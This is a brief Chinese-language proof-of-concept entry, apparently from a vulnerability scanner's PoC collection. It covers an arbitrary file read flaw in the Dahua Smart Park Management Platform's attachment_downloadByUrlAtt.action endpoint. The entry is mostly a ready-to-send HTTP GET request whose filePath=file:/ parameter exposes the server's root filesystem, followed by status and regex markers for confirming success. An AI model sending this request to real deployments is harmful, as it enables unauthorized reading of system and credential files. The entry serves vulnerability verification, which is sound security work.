﻿# 大华智慧园区管理平台 attachment_downloadByUrlAtt.action 任意文件读取

> 更新时间：2023-12-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/ HTTP/1.1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?dev)(?=.*?etc).*?$

> 上传文件定位：

> 验证文件来源：大华智慧园区管理平台 attachment_downloadByUrlAtt.action 任意文件读取.poc
